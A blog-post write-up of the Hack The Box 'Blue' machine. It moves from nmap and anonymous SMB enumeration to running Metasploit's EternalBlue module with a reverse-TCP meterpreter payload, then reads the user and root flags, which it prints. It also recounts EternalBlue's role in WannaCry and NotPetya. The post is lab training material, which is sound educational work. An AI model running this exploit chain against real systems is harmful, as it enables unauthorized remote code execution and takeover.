Title: Hack The Box: Blue
Date: 2023-10-31
Category: Blog
Tags: CTF, Cybersecurity, Hack The Box
Author: Matt Spraggs

It's been a while, but this is my last write-up of the machines in the
[Hack The Box](https://www.hackthebox.com) Beginner Track. This machine is
called Blue.

# Enumeration

As with several of the other challenges, all we're given to start with is the IP
address of the target. Let's start with a simple `nmap` port scan:

```shell-session
$ nmap -A -Pn blue.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-23 23:03 BST
Nmap scan report for blue.htb (10.129.126.4)
Host is up (0.045s latency).
rDNS record for 10.129.126.4: blue
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m57s, deviation: 34m37s, median: 1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-10-23T23:04:34+01:00
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-10-23T22:04:36
|_  start_date: 2023-10-23T20:59:17

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.06 seconds
```

Looks like this is a Windows machine, and it's running
[NetBIOS](https://en.wikipedia.org/wiki/NetBIOS) and the
[Server Message Block](https://en.wikipedia.org/wiki/Server_Message_Block) (SMB)
protocol that we encountered before in [Lame]({filename}/hack-the-box-lame.md).
We can check which folders and printers it has shared using `smbclient`:

```shell-session
$ smbclient -L \/\/blue.htb\/ \/\/blue.htb\/
Password for [WORKGROUP\htb-mutinysetup]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Share           Disk      
	Users           Disk      
SMB1 disabled -- no workgroup available
```

We can try and connect to these shares as well. Let's try the `Users` share:

```shell-session
$ smbclient \/\/blue.htb\/Users
Password for [WORKGROUP\htb-mutinysetup]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Jul 21 07:56:23 2017
  ..                                 DR        0  Fri Jul 21 07:56:23 2017
  Default                           DHR        0  Tue Jul 14 08:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 05:54:24 2009
  Public                             DR        0  Tue Apr 12 08:51:29 2011

		4692735 blocks of size 4096. 657596 blocks available
smb: \>
```

Wow, that was surprisingly easy... There's no authentication at all. We didn't
even have to provide a password. Now we're in, let's have a look around:

```shell-session
smb: \> cd Default
smb: \Default\> ls
  .                                 DHR        0  Tue Jul 14 08:07:31 2009
  ..                                DHR        0  Tue Jul 14 08:07:31 2009
  AppData                           DHn        0  Tue Jul 14 04:20:08 2009
  Desktop                            DR        0  Tue Jul 14 03:34:59 2009
  Documents                          DR        0  Tue Jul 14 06:08:56 2009
  Downloads                          DR        0  Tue Jul 14 03:34:59 2009
  Favorites                          DR        0  Tue Jul 14 03:34:59 2009
  Links                              DR        0  Tue Jul 14 03:34:59 2009
  Music                              DR        0  Tue Jul 14 03:34:59 2009
  NTUSER.DAT                       AHSn   262144  Fri Jul 14 23:37:57 2017
  NTUSER.DAT.LOG                     AH     1024  Tue Apr 12 08:54:55 2011
  NTUSER.DAT.LOG1                    AH   189440  Sun Jul 16 21:22:24 2017
  NTUSER.DAT.LOG2                    AH        0  Tue Jul 14 03:34:08 2009
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf    AHS    65536  Tue Jul 14 05:45:54 2009
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Tue Jul 14 05:45:54 2009
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Tue Jul 14 05:45:54 2009
  Pictures                           DR        0  Tue Jul 14 03:34:59 2009
  Saved Games                        Dn        0  Tue Jul 14 03:34:59 2009
  Videos                             DR        0  Tue Jul 14 03:34:59 2009

		4692735 blocks of size 4096. 657596 blocks available
smb: \Default\>
```

The default user contains all the usual directories, such as `AppData`,
`Documents`, and so on. There are also a slew of files starting with
`NTUSER.DAT`. `NTUSER.DAT`, in particular, is the
[Windows Registry](https://en.wikipedia.org/wiki/Windows_Registry) file for this
user. Maybe we'll find some password or similar in there?

# Exploit

After getting hold of these registry files I admit I spent a lot of time
exploring a totally different set of possibilities to the main solution below. I
became convinced that the registry held the next piece of information, and some
trick was needed to extract it. This meant I spent a lot of time messing about
with registry extraction tools, such as
[hivexsh](https://linux.die.net/man/1/hivexsh). Eventually I realised this
approach wasn't going to work. I'd need a different approach if I was going to
make any progress.

The machine is called Blue, and it runs Windows. A few years ago, in 2017, an
exploit called [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue) was
leaked by a group known as
[The Shadow Brokers](https://en.wikipedia.org/wiki/The_Shadow_Brokers).
EternalBlue uses a weakness in the implementation of SMB to allow an attacker to
execute code on the target by sending carefully constructed packets to the
server. The impact of this leak was, to put it mildy, devastating. The exploit
was central to the implementation of the
[WannaCry](https://en.wikipedia.org/wiki/WannaCry_ransomware_attack) ransomware,
which is estimated to have infected around 200,000 machines across 150 countries
back in 2017. WannaCry made headlines in the UK for crippling the IT
infrastructure of the NHS, which at the time ran a large number of Windows XP
machines, which weren't patched and which Microsoft no longer supported.
EternalBlue was also a key ingredient in the
[NotPetya](https://en.wikipedia.org/wiki/2017_NotPetya_cyberattack) cyber
attack, which caused significant disruption to IT systems in 2017 and hundreds
of millions of dollars in damage. The exploit itself is rumoured to have
originated from the
[NSA](https://en.wikipedia.org/wiki/National_Security_Agency), who used it to
gain remote access to machines of interest.

Returning to the machine at hand, could EternalBlue be the weakness we need to
exploit here? Let's find out.

Conveniently, [Metasploit](https://www.metasploit.com) contains an existing
exploit for the EternalBlue vulnerability:

```shell-session
$ msfconsole

... Metasploit spits out a load of ASCII art/version stuff here that I'll leave out ...

[msf](Jobs:0 Agents:0) >> use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >>
```

There's a few options we need to set before we can run the exploit:

```shell-session
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     167.99.201.13    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >>
```

Some of these are optional, and others have been populated for us by Metasploit.
We'll set the following options:

* The value for `RHOSTS` needs to be set to the hostname of the machine we're
  attacking, i.e. `blue.htb`.
* We need to set `LHOST` to point to our machine. We can do this by setting the
  network interface we use to connect to the target, `tun0`.
* Finally, we also need to set `SMBDomain` to `WORKGROUP\x00`, the workgroup
  determined through our enumeration work above.

```shell-session
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set SMBDomain WORKGROUP\\x00
SMBDomain => WORKGROUP\x00
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set LHOST tun0
LHOST => 10.10.14.3
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set RHOSTS blue.htb
RHOSTS => blue.htb
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >>
```

Okay, we're all set. Let's run the exploit...

```shell-session
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> run

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] 10.129.199.202:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.199.202:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.199.202:445    - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.199.202:445 - The target is vulnerable.
[*] 10.129.199.202:445 - Connecting to target for exploitation.
[+] 10.129.199.202:445 - Connection established for exploitation.
[+] 10.129.199.202:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.199.202:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.199.202:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.199.202:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.199.202:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.199.202:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.199.202:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.199.202:445 - Sending all but last fragment of exploit packet
[*] 10.129.199.202:445 - Starting non-paged pool grooming
[+] 10.129.199.202:445 - Sending SMBv2 buffers
[+] 10.129.199.202:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.199.202:445 - Sending final SMBv2 buffers.
[*] 10.129.199.202:445 - Sending last fragment of exploit packet!
[*] 10.129.199.202:445 - Receiving response from exploit packet
[+] 10.129.199.202:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.199.202:445 - Sending egg to corrupted connection.
[*] 10.129.199.202:445 - Triggering free of corrupted buffer.
[-] 10.129.199.202:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.129.199.202:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.129.199.202:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.129.199.202:445 - Connecting to target for exploitation.
[+] 10.129.199.202:445 - Connection established for exploitation.
[+] 10.129.199.202:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.199.202:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.199.202:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.199.202:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.199.202:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.199.202:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.199.202:445 - Trying exploit with 17 Groom Allocations.
[*] 10.129.199.202:445 - Sending all but last fragment of exploit packet
[*] 10.129.199.202:445 - Starting non-paged pool grooming
[+] 10.129.199.202:445 - Sending SMBv2 buffers
[+] 10.129.199.202:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.199.202:445 - Sending final SMBv2 buffers.
[*] 10.129.199.202:445 - Sending last fragment of exploit packet!
[*] 10.129.199.202:445 - Receiving response from exploit packet
[+] 10.129.199.202:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.199.202:445 - Sending egg to corrupted connection.
[*] 10.129.199.202:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.129.199.202
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.129.199.202:49161) at 2023-04-24 22:40:35 +0100
[+] 10.129.199.202:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.199.202:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.199.202:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

(Meterpreter 1)(C:\Windows\system32) >
```

Nice! We have a shell. Now we can set about extracting the flags.

```shell-session
(Meterpreter 1)(C:\Windows\system32) > cd ../..
(Meterpreter 1)(C:\) > cd Users
(Meterpreter 1)(C:\Users) > ls
Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2017-07-21 07:56:36 +0100  Administrator
040777/rwxrwxrwx  0     dir   2009-07-14 06:08:56 +0100  All Users
040555/r-xr-xr-x  8192  dir   2009-07-14 08:07:31 +0100  Default
040777/rwxrwxrwx  0     dir   2009-07-14 06:08:56 +0100  Default User
040555/r-xr-xr-x  4096  dir   2011-04-12 08:51:29 +0100  Public
100666/rw-rw-rw-  174   fil   2009-07-14 05:54:24 +0100  desktop.ini
040777/rwxrwxrwx  8192  dir   2017-07-14 14:45:53 +0100  haris

(Meterpreter 1)(C:\Users) >
```

Great, so we have some of the user directories we saw before in the `smbclient`
session, along with a few new ones. Let's get the flags from the `haris` and
`Administrator` users:


```shell-session
(Meterpreter 1)(C:\Users) > cd haris
(Meterpreter 1)(C:\Users\haris) > cd Desktop
(Meterpreter 1)(C:\Users\haris\Desktop) > ls
Listing: C:\Users\haris\Desktop
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-07-15 08:58:32 +0100  desktop.ini
100444/r--r--r--  34    fil   2023-04-24 22:19:48 +0100  user.txt

(Meterpreter 1)(C:\Users\haris\Desktop) > cat user.txt
539a6c882d13b2aac303a109e16a90bb
(Meterpreter 1)(C:\Users\haris\Desktop) > cd ../..
(Meterpreter 1)(C:\Users) > cd Administrator
(Meterpreter 1)(C:\Users\Administrator) > cd Desktop
(Meterpreter 1)(C:\Users\Administrator\Desktop) > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-07-21 07:56:40 +0100  desktop.ini
100444/r--r--r--  34    fil   2023-04-24 22:19:48 +0100  root.txt

(Meterpreter 1)(C:\Users\Administrator\Desktop) > cat root.txt
f995001e9c9c2f798fbaafa2954641fa
(Meterpreter 1)(C:\Users\Administrator\Desktop) >
```

Awesome! This gives us two flags: `539a6c882d13b2aac303a109e16a90bb` for
`haris`, and `f995001e9c9c2f798fbaafa2954641fa` for the `Administrator`.

On that note, we're done. Not the most exciting machine to finish on, but the
historical context around EternalBlue made for interesting research. That also
concludes the Beginner Track. Would definitely recommend to anyone with an
interest in computer security and learning how knowledge of computer systems can
be misused.

